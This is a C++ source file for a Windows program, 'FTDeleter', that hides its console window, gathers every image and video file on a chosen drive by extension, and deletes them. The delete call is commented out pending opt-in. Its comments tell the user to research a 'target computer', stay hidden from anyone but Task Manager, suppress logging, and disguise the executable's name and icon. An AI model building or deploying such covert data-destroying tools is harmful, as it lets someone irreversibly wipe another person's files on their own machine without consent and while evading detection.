//by. Sean Jesky i hope this helps someone out there. Please use in a responsible way.. 
/*
 * FILE('s): main.cpp
 * DATE&TIME: 9/7/2024
 * CREATED_BY: Sean Jesky ()
 * CREATED_FOR: you can imagine, this is meant to help stop bad files from being spread...
 * WHAT_IT_DOES:  data collected in the nodes matching the extension type of the file, deletes it from the computer. (not yet case-insensitive)
 * WINDOWS WARNING: remeber, will not compile unless using std c++17 option in program properties.

 TESTED ON: WINDOWS x86(32bit), x64(64bit) Windows.

		 program's total size is ~49kb in total in x64 release mode.
*/

#include "linked_list.h"
#include "fsHelper.h"
//,,,
#include <filesystem>
namespace fs = std::filesystem;
#include <exception>
#include <vector>
using std::vector;
//...
#include <iostream>
#include <chrono>
#include <ctime>
#include <iomanip>
using std::setfill; using std::setw;
//...
//END OF WINDOWS INCLUDES, AND OTHER SPECIFICS NEEDED/WANTED FOR PROPER FUNCTIONING OF WINDOWS API's.
#define __AUTHOR__		"Sean Mikhial Jesky"
#define __EXE_VERSION__		"1.00"
#define __EXECUTABLE_NAME__	"FTDeleter.exe"
#define __YEAR_WRITTEN__	"2024"


/// (LinuxOS compiling Command) clang++ -std=c++17 -lstdc++fs -o FileTypeDeleter.out main.cpp linked_list.cpp fsHelper.cpp
/// /
/// /
/// @brief (FTDeleter.exe Version 1.10) 
///			This program goes through a filesystem, gets all the file extensions,
///			creates directories from those extensions, and copies files to the corresponding directory extension name.
/// just realized that my linked list could easly be re-applied for this type of use, so i did it. thats why. 
/// //think like a spy to use properly:

	//know the drives you need before hand, this is the research of your target computer.
	//know how the file types, if images are from iphone, then make sure you look at what types you may encounter for media files, add those to the list below.
	//know that just because its hidden, doesnt mean its not running, if they use task manager (ctrl+alt+del) then its visible.
	//know that this will not just delete images of you but every image or video on that computer (only memory forensics could recover them mostly)
	//know they suck for holding something over you, and  i hope this gives someone the edge to have their life back.
	//thinking of making the code crawl from each directory to the next, id like this to be plug and play as much as i can make it.


/// @param int argv 
/// @param char *argc 
/// @return 
int main(int argv, char* argc[])
{
	//hide window when program is in use.
	ShowWindow(GetConsoleWindow(), 0);

	//DEFAULT Remove from: DIRECTORY: (MAKE SURE ITS THE CORRECT NAME< THIS VALUE IS NOT CHECKED BEFORE ITS USED< PROGRAM MAY NOT RUN IF NOT A VALID DRIVE
	const element_t path_to_delete_from = "C:/";
	//comment this line, and uncomment the one below it if you need more than one directory to delete from, and that directory is not C:/
	vector<element_t> p_files { path_to_delete_from};
	//vector<element_t> p_files vector<element_t>{ "C:/" , "D:/", "E:/", "F:/" /*add more or remove from here*/}); //if you need a specific directory(s), place them here in this format,  and uncomment this line and comment the one above.

	std::vector<element_t> extensions_to_remove_from_system{ ".jpg", ".JPG", ".tiff", ".TIFF", ".jpeg", ".JPEG", ".mp4", ".MP4", ".png", ".PNG" /*add more extensions or remove to only delete the ones that matter to you, to delete.*/ };

	std::sort(extensions_to_remove_from_system.begin(), extensions_to_remove_from_system.end());

	//write function that makes each image into a nothingness just a black or white image of nothing more, making each pixal the same value 255 or 0, just by doing some simple bit manipulation. its nice to have options.


	p_files = collect_relivant_files(p_files, extensions_to_remove_from_system);
	element_t p_path = "";

	std::unique_ptr<linked_list> llist(new linked_list());
	//USER NOTICE: WARNING <<<< CAUTION <<<< DANGROUS <<<< CARFUL APPLICATION <<<<<< PLEASE KNOW RISKS <<<<<
	//uncommenting (remove "//" <-) this line below acknowlages. you know the risks even with my bad spelling you understand, and you know how the program works, and by uncommenting the line below. it will delete all the files of the type provided to the program to search for and delete.

	// llist->orgainze_nodes(p_files, p_path).delete_files_of_type_in_nodes();
	
	// ^ goes through the linked_list, and deletes those files from the system if they are there in the linked list nodes.
	//i really dont know where anymore data is being allocated improperly... so idk... valgrind --leak test is up next i guess

}
//removed all printing on the console in case its logged - the only way someone will know its running is if they use task manager
//you may want to consider changing the name of the executable thats produced and changing the logo of the exe. in case as well.